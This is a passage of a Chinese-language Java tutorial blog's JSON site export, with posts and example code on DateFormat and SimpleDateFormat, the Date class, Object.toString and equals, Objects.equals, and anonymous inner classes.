DateFormat类的format方法和parse方法","slug":"java00138DateFormat类的format方法和parse方法","date":"2020-03-14T06:01:01.000Z","updated":"2020-03-14T17:23:35.961Z","comments":true,"path":"2020/03/14/java00138DateFormat类的format方法和parse方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00138DateFormat类的format方法和parse方法/","excerpt":"","text":"java DateFormat类的format方法和parse方法 java.text.DateFormat:是日期/时间格式化子类的抽象类 作用: 格式化（也就是日期 -&gt; 文本）、解析（文本-&gt; 日期） 成员方法: String format(Date date) 按照指定的模式,把Date日期,格式化为符合模式的字符串 Date parse(String source) 把符合模式的字符串,解析为Date日期 DateFormat类是一个抽象类,无法直接创建对象使用,可以使用DateFormat类的子类 java.text.SimpleDateFormat extends DateFormat 构造方法: SimpleDateFormat(String pattern) 用给定的模式和默认语言环境的日期格式符号构造 SimpleDateFormat。 参数: String pattern:传递指定的模式 模式:区分大小写的 y 年 M 月 d 日 H 时 m 分 s 秒 写对应的模式,会把模式替换为对应的日期和时间 “yyyy-MM-dd HH:mm:ss” 注意: 模式中的字母不能更改,连接模式的符号可以改变 “yyyy年MM月dd日 HH时mm分ss秒” 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.itheima.demo03.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;public class Demo01DateFormat &#123; public static void main(String[] args) throws ParseException &#123; demo02(); &#125; /* 使用DateFormat类中的方法parse,把文本解析为日期 使用步骤: 1.创建SimpleDateFormat对象,构造方法中传递指定的模式 2.调用SimpleDateFormat对象中的方法parse,把符合构造方法中模式的字符串,解析为Date日期 注意: public Date parse(String source) throws ParseException parse方法声明了一个异常叫ParseException 如果字符串和构造方法的模式不一样,那么程序就会抛出此异常 调用一个抛出了异常的方法,就必须的处理这个异常,要么throws继续抛出这个异常,要么try catch自己处理 */ private static void demo02() throws ParseException &#123; //1.创建SimpleDateFormat对象,构造方法中传递指定的模式 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒\"); //2.调用SimpleDateFormat对象中的方法parse,把符合构造方法中模式的字符串,解析为Date日期 //Date parse(String source) 把符合模式的字符串,解析为Date日期 Date date = sdf.parse(\"2088年08月08日 15时51分54秒\"); System.out.println(date); &#125; /* 使用DateFormat类中的方法format,把日期格式化为文本 使用步骤: 1.创建SimpleDateFormat对象,构造方法中传递指定的模式 2.调用SimpleDateFormat对象中的方法format,按照构造方法中指定的模式,把Date日期格式化为符合模式的字符串(文本) */ private static void demo01() &#123; //1.创建SimpleDateFormat对象,构造方法中传递指定的模式 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒\"); //2.调用SimpleDateFormat对象中的方法format,按照构造方法中指定的模式,把Date日期格式化为符合模式的字符串(文本) //String format(Date date) 按照指定的模式,把Date日期,格式化为符合模式的字符串 Date date = new Date(); String d = sdf.format(date); System.out.println(date);//Sun Aug 08 15:51:54 CST 2088 System.out.println(d);//2088年08月08日 15时51分54秒 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java DateFormat类与SimpleDateFormat类介绍","slug":"java00137DateFormat类与SimpleDateFormat类介绍","date":"2020-03-14T00:48:45.000Z","updated":"2020-03-14T00:57:13.679Z","comments":true,"path":"2020/03/14/java00137DateFormat类与SimpleDateFormat类介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00137DateFormat类与SimpleDateFormat类介绍/","excerpt":"","text":"java DateFormat类与SimpleDateFormat类介绍 java.text.DateFormat:是日期/时间格式化子类的抽象类 作用: 格式化（也就是日期 -&gt; 文本）、解析（文本-&gt; 日期） 成员方法: String format(Date date) 按照指定的模式,把Date日期,格式化为符合模式的字符串 Date parse(String source) 把符合模式的字符串,解析为Date日期 DateFormat类是一个抽象类,无法直接创建对象使用,可以使用DateFormat类的子类 java.text.SimpleDateFormat extends DateFormat 构造方法: SimpleDateFormat(String pattern) 用给定的模式和默认语言环境的日期格式符号构造 SimpleDateFormat。 参数: String pattern:传递指定的模式 模式:区分大小写的 y 年 M 月 d 日 H 时 m 分 s 秒 写对应的模式,会把模式替换为对应的日期和时间 “yyyy-MM-dd HH:mm:ss” 注意: 模式中的字母不能更改,连接模式的符号可以改变 “yyyy年MM月dd日 HH时mm分ss秒” */ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.itheima.demo03.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;public class Demo01DateFormat &#123; public static void main(String[] args) throws ParseException &#123; demo02(); &#125; /* 使用DateFormat类中的方法parse,把文本解析为日期 使用步骤: 1.创建SimpleDateFormat对象,构造方法中传递指定的模式 2.调用SimpleDateFormat对象中的方法parse,把符合构造方法中模式的字符串,解析为Date日期 注意: public Date parse(String source) throws ParseException parse方法声明了一个异常叫ParseException 如果字符串和构造方法的模式不一样,那么程序就会抛出此异常 调用一个抛出了异常的方法,就必须的处理这个异常,要么throws继续抛出这个异常,要么try catch自己处理 */ private static void demo02() throws ParseException &#123; //1.创建SimpleDateFormat对象,构造方法中传递指定的模式 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒\"); //2.调用SimpleDateFormat对象中的方法parse,把符合构造方法中模式的字符串,解析为Date日期 //Date parse(String source) 把符合模式的字符串,解析为Date日期 Date date = sdf.parse(\"2088年08月08日 15时51分54秒\"); System.out.println(date); &#125; /* 使用DateFormat类中的方法format,把日期格式化为文本 使用步骤: 1.创建SimpleDateFormat对象,构造方法中传递指定的模式 2.调用SimpleDateFormat对象中的方法format,按照构造方法中指定的模式,把Date日期格式化为符合模式的字符串(文本) */ private static void demo01() &#123; //1.创建SimpleDateFormat对象,构造方法中传递指定的模式 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒\"); //2.调用SimpleDateFormat对象中的方法format,按照构造方法中指定的模式,把Date日期格式化为符合模式的字符串(文本) //String format(Date date) 按照指定的模式,把Date日期,格式化为符合模式的字符串 Date date = new Date(); String d = sdf.format(date); System.out.println(date);//Sun Aug 08 15:51:54 CST 2088 System.out.println(d);//2088年08月08日 15时51分54秒 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java Date类的构造方法和成员方法","slug":"java00136Date类的构造方法和成员方法","date":"2020-03-14T00:41:32.000Z","updated":"2020-03-14T00:46:49.094Z","comments":true,"path":"2020/03/14/java00136Date类的构造方法和成员方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00136Date类的构造方法和成员方法/","excerpt":"","text":"java Date类的构造方法和成员方法 12345678910111213141516171819202122232425262728293031323334353637383940package com.itheima.demo02.Date;import java.util.Date;public class Demo02Date &#123; public static void main(String[] args) &#123; demo03(); &#125; /* long getTime() 把日期转换为毫秒值(相当于System.currentTimeMillis()方法) 返回自 1970 年 1 月 1 日 00:00:00 GMT 以来此 Date 对象表示的毫秒数。 */ private static void demo03() &#123; Date date = new Date(); long time = date.getTime(); System.out.println(time);//3742777636267 &#125; /* Date类的带参数构造方法 Date(long date) :传递毫秒值,把毫秒值转换为Date日期 */ private static void demo02() &#123; Date date = new Date(0L); System.out.println(date);// Thu Jan 01 08:00:00 CST 1970 date = new Date(3742767540068L); System.out.println(date);// Sun Aug 08 09:39:00 CST 2088 &#125; /* Date类的空参数构造方法 Date() 获取当前系统的日期和时间 */ private static void demo01() &#123; Date date = new Date(); System.out.println(date);//Sun Aug 08 12:23:03 CST 2088 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java Object与Objects类总结","slug":"java00135Object与Objects类总结","date":"2020-03-14T00:37:43.000Z","updated":"2020-03-18T15:34:55.897Z","comments":true,"path":"2020/03/14/java00135Object与Objects类总结/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00135Object与Objects类总结/","excerpt":"","text":"java Object与Objects类总结 在刚才IDEA自动重写equals代码中，使用到了java.util.Objects类，那么这个类是什么呢？ 在JDK7添加了一个Objects工具类，它提供了一些方法来操作对象，它由一些静态的实用方法组成，这些方法是null-save（空指针安全的）或null-tolerant（容忍空指针的），用于计算对象的hashcode、返回对象的字符串表示形式、比较两个对象。 在比较两个对象的时候，Object的equals方法容易抛出空指针异常，而Objects类中的equals方法就优化了这个问题。方法如下： public static boolean equals(Object a, Object b):判断两个对象是否相等。 我们可以查看一下源码，学习一下： 123public static boolean equals(Object a, Object b) &#123; return (a == b) || (a != null &amp;&amp; a.equals(b)); &#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java毫秒值的概念和作用","slug":"java00134毫秒值的概念和作用","date":"2020-03-13T16:12:30.000Z","updated":"2020-03-13T16:16:30.850Z","comments":true,"path":"2020/03/14/java00134毫秒值的概念和作用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00134毫秒值的概念和作用/","excerpt":"","text":"java毫秒值的概念和作用 java.util.Date: 表示日期和时间的类 类 Date 表示特定的瞬间，精确到毫秒。 毫秒:千分之一秒 1000毫秒=1秒 特定的瞬间:一个时间点,一刹那时间 2088-08-08 09:55:33:333 瞬间 2088-08-08 09:55:33:334 瞬间 2088-08-08 09:55:33:334 瞬间 … 毫秒值的作用: 可以对时间和日期进行计算 2099-01-03 到 2088-01-01 中间一共有多少天 可以日期转换为毫秒进行计算,计算完毕,在把毫秒转换为日期 把日期转换为毫秒: 当前的日期: 2088-01-01 时间原点(0毫秒): 1970 年 1 月 1 日 00:00:00(英国格林威治) 就是计算当前日期到时间原点之间一共经历了多少毫秒 (3742767540068L) 注意: 中国属于东八区,会把时间增加8个小时 1970 年 1 月 1 日 08:00:00 把毫秒转换为日期: 1 天 = 24 × 60 × 60 = 86400 秒 = 86400 x 1000 = 86400000毫秒 1234567package com.itheima.demo02.Date;public class Demo01Date &#123; public static void main(String[] args) &#123; System.out.println(System.currentTimeMillis());//获取当前系统时间到1970 年 1 月 1 日 00:00:00经历了多少毫秒 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java Object类的toString方法","slug":"java00133Object类的toString方法","date":"2020-03-13T16:07:55.000Z","updated":"2020-03-13T16:10:15.376Z","comments":true,"path":"2020/03/14/java00133Object类的toString方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00133Object类的toString方法/","excerpt":"","text":"java Object类的toString方法 ​ java.lang.Object ​ 类 Object 是类层次结构的根(父)类。 ​ 每个类(Person,Student…)都使用 Object 作为超(父)类。 ​ 所有对象（包括数组）都实现这个类的方法。 12345678910111213141516171819202122232425262728293031323334package com.itheima.demo01.Object;import java.util.ArrayList;import java.util.Random;import java.util.Scanner;public class Demo01ToString&#123; public static void main(String[] args) &#123; /* Person类默认继承了Object类,所以可以使用Object类中的toString方法 String toString() 返回该对象的字符串表示。 */ Person p = new Person(\"张三\",18); String s = p.toString(); System.out.println(s);//com.itheima.demo01.Object.Person@75412c2f | abc | Person&#123;name=张三 ,age=18&#125; //直接打印对象的名字,其实就是调用对象的toString p=p.toString(); System.out.println(p);//com.itheima.demo01.Object.Person@5f150435 | abc | Person&#123;name=张三 ,age=18&#125; //看一个类是否重写了toString,直接打印这个类的对象即可,如果没有重写toString方法那么打印的是对象的地址值 Random r = new Random(); System.out.println(r);//java.util.Random@3f3afe78 没有重写toString方法 Scanner sc = new Scanner(System.in); System.out.println(sc);//java.util.Scanner[delimiters=\\p&#123;javaWhitespace&#125;+.. 重写toString方法 ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1); list.add(2); list.add(3); System.out.println(list);//[1, 2, 3] 重写toString方法 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaObject类的equals方法2","slug":"java00132Object类的equals方法2","date":"2020-03-13T15:59:19.000Z","updated":"2020-03-13T16:05:16.979Z","comments":true,"path":"2020/03/13/java00132Object类的equals方法2/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00132Object类的equals方法2/","excerpt":"","text":"java Object类的equals方法2 1234567boolean b = s1.equals(s2); // NullPointerException null是不能调用方法的,会抛出空指针异常System.out.println(b);//Objects类的equals方法:对两个对象进行比较,防止空指针异常public static boolean equals(Object a, Object b) &#123;return (a == b) || (a != null &amp;&amp; a.equals(b));&#125; 123456789101112131415package com.itheima.demo01.Object;import java.util.Objects;public class Demo03Objects &#123; public static void main(String[] args) &#123; String s1 = \"abc\"; //String s1 = null; String s2 = \"abc\"; boolean b2 = Objects.equals(s1, s2); System.out.println(b2); &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899package com.itheima.demo01.Object;import java.util.Objects;public class Person &#123; private String name; private int age; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; /* 直接打印对象的地址值没有意义,需要重写Object类中的toString方法 打印对象的属性(name,age) */ /*@Override public String toString() &#123; //return \"abc\"; return \"Person&#123;name=\"+name+\" ,age=\"+age+\"&#125;\"; &#125;*/ /*@Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125;*/ /* Object类的equals方法,默认比较的是两个对象的地址值,没有意义 所以我们要重写equals方法,比较两个对象的属性(name,age) 问题: 隐含着一个多态 多态的弊端:无法使用子类特有的内容(属性和方法) Object obj = p2 = new Person(\"古力娜扎\",19); 解决:可以使用向下转型(强转)把obj类型转换为Person */ /*@Override public boolean equals(Object obj) &#123; //增加一个判断,传递的参数obj如果是this本身,直接返回true,提高程序的效率 if(obj==this)&#123; return true; &#125; //增加一个判断,传递的参数obj如果是null,直接返回false,提高程序的效率 if(obj==null)&#123; return false; &#125; //增加一个判断,防止类型转换一次ClassCastException if(obj instanceof Person)&#123; //使用向下转型,把obj转换为Person类型 Person p = (Person)obj; //比较两个对象的属性,一个对象是this(p1),一个对象是p(obj-&gt;p2) boolean b = this.name.equals(p.name) &amp;&amp; this.age==p.age; return b; &#125; //不是Person类型直接返回false return false; &#125;*/ @Override public boolean equals(Object o) &#123; if (this == o) return true; //getClass() != o.getClass() 使用反射技术,判断o是否是Person类型 等效于 obj instanceof Person if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; return age == person.age &amp;&amp; Objects.equals(name, person.name); &#125; @Override public int hashCode() &#123; return Objects.hash(name, age); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java重写Object类的equals方法","slug":"java00131重写Object类的equals方法","date":"2020-03-13T15:50:46.000Z","updated":"2020-03-13T15:56:47.356Z","comments":true,"path":"2020/03/13/java00131重写Object类的equals方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00131重写Object类的equals方法/","excerpt":"","text":"java 重写Object类的equals方法 直接打印对象的地址值没有意义,需要重写Object类中的toString方法 打印对象的属性(name,age) 123456789101112@Override public String toString() &#123; //return \"abc\"; return \"Person&#123;name=\"+name+\" ,age=\"+age+\"&#125;\"; &#125; @Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; Object类的equals方法,默认比较的是两个对象的地址值,没有意义 所以我们要重写equals方法,比较两个对象的属性(name,age) 问题: 隐含着一个多态 多态的弊端:无法使用子类特有的内容(属性和方法) Object obj = p2 = new Person(&quot;古力娜扎&quot;,19); 解决:可以使用向下转型(强转)把obj类型转换为Person 1234567891011121314151617181920212223@Override public boolean equals(Object obj) &#123; //增加一个判断,传递的参数obj如果是this本身,直接返回true,提高程序的效率 if(obj==this)&#123; return true; &#125; //增加一个判断,传递的参数obj如果是null,直接返回false,提高程序的效率 if(obj==null)&#123; return false; &#125; //增加一个判断,防止类型转换一次ClassCastException if(obj instanceof Person)&#123; //使用向下转型,把obj转换为Person类型 Person p = (Person)obj; //比较两个对象的属性,一个对象是this(p1),一个对象是p(obj-&gt;p2) boolean b = this.name.equals(p.name) &amp;&amp; this.age==p.age; return b; &#125; //不是Person类型直接返回false return false; &#125; 1234567891011121314151617181920212223242526272829303132333435package com.itheima.demo01.Object;import java.util.ArrayList;public class Demo02Equals &#123; public static void main(String[] args) &#123; /* Person类默认继承了Object类,所以可以使用Object类的equals方法 boolean equals(Object obj) 指示其他某个对象是否与此对象“相等”。 equals方法源码: public boolean equals(Object obj) &#123; return (this == obj); &#125; 参数: Object obj:可以传递任意的对象 == 比较运算符,返回的是一个布尔值 true false 基本数据类型:比较的是值 引用数据类型:比价的是两个对象的地址值 this是谁?那个对象调用的方法,方法中的this就是那个对象;p1调用的equals方法所以this就是p1 obj是谁?传递过来的参数p2 this==obj --&gt;p1==p2 */ Person p1 = new Person(\"迪丽热巴\",18); //Person p2 = new Person(\"古力娜扎\",19); Person p2 = new Person(\"迪丽热巴\",18); System.out.println(\"p1:\"+p1);//p1:com.itheima.demo01.Object.Person@58ceff1 System.out.println(\"p2:\"+p2);//p2:com.itheima.demo01.Object.Person@7c30a502 //p1=p2;//把p2的地址值赋值给p1 ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); boolean b = p1.equals(p1); System.out.println(b); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.itheima.demo01.Object;import java.util.Objects;public class Person &#123; private String name; private int age; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public boolean equals(Object o) &#123; if (this == o) return true; //getClass() != o.getClass() 使用反射技术,判断o是否是Person类型 等效于 obj instanceof Person if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; return age == person.age &amp;&amp; Objects.equals(name, person.name); &#125; @Override public int hashCode() &#123; return Objects.hash(name, age); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaObject类的equals方法","slug":"java00130Object类的equals方法","date":"2020-03-13T15:44:22.000Z","updated":"2020-03-13T15:49:42.885Z","comments":true,"path":"2020/03/13/java00130Object类的equals方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00130Object类的equals方法/","excerpt":"","text":"java Object类的equals方法 Person类默认继承了Object类,所以可以使用Object类的equals方法 boolean equals(Object obj) 指示其他某个对象是否与此对象“相等”。 equals方法源码: 123public boolean equals(Object obj) &#123;return (this == obj);&#125; 参数: Object obj:可以传递任意的对象 ==比较运算符,返回的是一个布尔值true false 基本数据类型:比较的是值 引用数据类型:比价的是两个对象的地址值 this是谁?那个对象调用的方法,方法中的this就是那个对象;p1调用的equals方法所以this就是p1 obj是谁?传递过来的参数p2 this==obj --&gt;p1==p2 1234567891011121314151617181920package com.itheima.demo01.Object;import java.util.ArrayList;public class Demo02Equals &#123; public static void main(String[] args) &#123; Person p1 = new Person(\"迪丽热巴\",18); //Person p2 = new Person(\"古力娜扎\",19); Person p2 = new Person(\"迪丽热巴\",18); System.out.println(\"p1:\"+p1);//p1:com.itheima.demo01.Object.Person@58ceff1 System.out.println(\"p2:\"+p2);//p2:com.itheima.demo01.Object.Person@7c30a502 //p1=p2;//把p2的地址值赋值给p1 ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); boolean b = p1.equals(p1); System.out.println(b); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口作为成员变量类型","slug":"java00128接口作为成员变量类型","date":"2020-03-13T13:34:28.000Z","updated":"2020-03-13T13:38:28.209Z","comments":true,"path":"2020/03/13/java00128接口作为成员变量类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00128接口作为成员变量类型/","excerpt":"","text":"java接口作为成员变量类型 1234567891011121314151617181920212223242526272829303132package cn.itcast.day11.demo07;public class DemoGame &#123; public static void main(String[] args) &#123; Hero hero = new Hero(); hero.setName(\"艾希\"); // 设置英雄的名称 // 设置英雄技能// hero.setSkill(new SkillImpl()); // 使用单独定义的实现类 // 还可以改成使用匿名内部类// Skill skill = new Skill() &#123;// @Override// public void use() &#123;// System.out.println(\"Pia~pia~pia~\");// &#125;// &#125;;// hero.setSkill(skill); // 进一步简化，同时使用匿名内部类和匿名对象 hero.setSkill(new Skill() &#123; @Override public void use() &#123; System.out.println(\"Biu~Pia~Biu~Pia~\"); &#125; &#125;); hero.attack(); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940package cn.itcast.day11.demo07;public class Hero &#123; private String name; // 英雄的名称 //使用接口作为成员变量类型 private Skill skill; // 英雄的技能 public Hero() &#123; &#125; public Hero(String name, Skill skill) &#123; this.name = name; this.skill = skill; &#125; public void attack() &#123; System.out.println(\"我叫\" + name + \"，开始施放技能：\"); skill.use(); // 调用接口中的抽象方法 System.out.println(\"施放技能完成。\"); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Skill getSkill() &#123; return skill; &#125; public void setSkill(Skill skill) &#123; this.skill = skill; &#125;&#125; 1234567package cn.itcast.day11.demo07;public interface Skill &#123; void use(); // 释放技能的抽象方法&#125; 12345678package cn.itcast.day11.demo07;public class SkillImpl implements Skill &#123; @Override public void use() &#123; System.out.println(\"Biu~biu~biu~\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口作为方法的参数和或返回值","slug":"java00129接口作为方法的参数和或返回值","date":"2020-03-13T13:34:28.000Z","updated":"2020-03-13T13:44:50.090Z","comments":true,"path":"2020/03/13/java00129接口作为方法的参数和或返回值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00129接口作为方法的参数和或返回值/","excerpt":"","text":"java接口作为方法的参数和或返回值 1234567891011121314151617181920212223242526272829package cn.itcast.day11.demo07;import java.util.ArrayList;import java.util.List;/*java.util.List正是ArrayList所实现的接口。 */public class DemoInterface &#123; public static void main(String[] args) &#123; // 左边是接口名称，右边是实现类名称，这就是多态写法 List&lt;String&gt; list = new ArrayList&lt;&gt;(); List&lt;String&gt; result = addNames(list); for (int i = 0; i &lt; result.size(); i++) &#123; System.out.println(result.get(i)); &#125; &#125; public static List&lt;String&gt; addNames(List&lt;String&gt; list) &#123; list.add(\"迪丽热巴\"); list.add(\"古力娜扎\"); list.add(\"玛尔扎哈\"); list.add(\"沙扬娜拉\"); return list; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java类作为成员变量类型","slug":"java00127类作为成员变量类型","date":"2020-03-13T13:31:16.000Z","updated":"2020-03-13T13:33:24.331Z","comments":true,"path":"2020/03/13/java00127类作为成员变量类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00127类作为成员变量类型/","excerpt":"","text":"java类作为成员变量类型 123456789101112131415161718192021package cn.itcast.day11.demo06;public class DemoMain &#123; public static void main(String[] args) &#123; // 创建一个英雄角色 Hero hero = new Hero(); // 为英雄起一个名字，并且设置年龄 hero.setName(\"盖伦\"); hero.setAge(20); // 创建一个武器对象 Weapon weapon = new Weapon(\"AK-47\"); // 为英雄配备武器 hero.setWeapon(weapon); // 年龄为20的盖伦用多兰剑攻击敌方。 hero.attack(); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package cn.itcast.day11.demo06;// 游戏当中的英雄角色类public class Hero &#123; private String name; // 英雄的名字 private int age; // 英雄的年龄 private Weapon weapon; // 英雄的武器 public Hero() &#123; &#125; public Hero(String name, int age, Weapon weapon) &#123; this.name = name; this.age = age; this.weapon = weapon; &#125; public void attack() &#123; System.out.println(\"年龄为\" + age + \"的\" + name + \"用\" + weapon.getCode() + \"攻击敌方。\"); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public Weapon getWeapon() &#123; return weapon; &#125; public void setWeapon(Weapon weapon) &#123; this.weapon = weapon; &#125;&#125; 123456789101112131415161718192021package cn.itcast.day11.demo06;public class Weapon &#123; private String code; // 武器的代号 public Weapon() &#123; &#125; public Weapon(String code) &#123; this.code = code; &#125; public String getCode() &#123; return code; &#125; public void setCode(String code) &#123; this.code = code; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java匿名内部类的注意事项","slug":"java00126匿名内部类的注意事项","date":"2020-03-13T13:27:51.000Z","updated":"2020-03-13T13:31:48.800Z","comments":true,"path":"2020/03/13/java00126匿名内部类的注意事项/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00126匿名内部类的注意事项/","excerpt":"","text":"java匿名内部类的注意事项 对格式“new 接口名称() {…}”进行解析： new代表创建对象的动作 接口名称就是匿名内部类需要实现哪个接口 {…}这才是匿名内部类的内容 另外还要注意几点问题： 匿名内部类，在【创建对象】的时候，只能使用唯一一次。 如果希望多次创建对象，而且类的内容一样的话，那么就需要使用单独定义的实现类了。 匿名对象，在【调用方法】的时候，只能调用唯一一次。 如果希望同一个对象，调用多次方法，那么必须给对象起个名字。 匿名内部类是省略了【实现类/子类名称】，但是匿名对象是省略了【对象名称】 强调：匿名内部类和匿名对象不是一回事！！！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package cn.itcast.day11.demo05;public class DemoMain &#123; public static void main(String[] args) &#123;// MyInterface obj = new MyInterfaceImpl();// obj.method();// MyInterface some = new MyInterface(); // 错误写法！ // 使用匿名内部类，但不是匿名对象，对象名称就叫objA MyInterface objA = new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-A\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-A\"); &#125; &#125;; objA.method1(); objA.method2(); System.out.println(\"=================\"); // 使用了匿名内部类，而且省略了对象名称，也是匿名对象 new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-B\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-B\"); &#125; &#125;.method1(); // 因为匿名对象无法调用第二次方法，所以需要再创建一个匿名内部类的匿名对象 new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-B\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-B\"); &#125; &#125;.method2(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java匿名内部类","slug":"java00125匿名内部类","date":"2020-03-13T13:23:16.000Z","updated":"2020-03-13T13:27:21.360Z","comments":true,"path":"2020/03/13/java00125匿名内部类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00125匿名内部类/","excerpt":"","text":"如果接口的实现类（或者是父类的子类）只需要使用唯一的一次， 那么这种情况下就可以省略掉该类的定义，而改为使用【匿名内部类】。 匿名内部类的定义格式： 123接口名称 对象名 = new 接口名称() &#123; // 覆盖重写所有抽象方法&#125;; 对格式“new 接口名称() {…}”进行解析： new代表创建对象的动作 接口名称就是匿名内部类需要实现哪个接口 {…}这才是匿名内部类的内容 另外还要注意几点问题： 匿名内部类，在【创建对象】的时候，只能使用唯一一次。 如果希望多次创建对象，而且类的内容一样的话，那么就需要使用单独定义的实现类了。 匿名对象，在【调用方法】的时候，只能调用唯一一次。 如果希望同一个对象，调用多次方法，那么必须给对象起个名字。 匿名内部类是省略了【实现类/子类名称】，但是匿名对象是省略了【对象名称】 强调：匿名内部类和匿名对象不是一回事！！！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package cn.itcast.day11.demo05;public class DemoMain &#123; public static void main(String[] args) &#123;// MyInterface obj = new MyInterfaceImpl();// obj.method();// MyInterface some = new MyInterface(); // 错误写法！ // 使用匿名内部类，但不是匿名对象，对象名称就叫objA MyInterface objA = new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-A\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-A\"); &#125; &#125;; objA.method1(); objA.method2(); System.out.println(\"=================\"); // 使用了匿名内部类，而且省略了对象名称，也是匿名对象 new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-B\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-B\"); &#125; &#125;.method1(); // 因为匿名对象无法调用第二次方法，所以需要再创建一个匿名内部类的匿名对象 new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-B\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-B\"); &#125; &#125;.method2(); &#125;&#125; 123456789package cn.itcast.day11.demo05;public interface MyInterface &#123; void method1(); // 抽象方法 void method2();&#125; 12345678910111213package cn.itcast.day11.demo05;public class MyInterfaceImpl implements MyInterface &#123; @Override public void method1() &#123; System.out.println(\"实现类覆盖重写了方法！111\"); &#125; 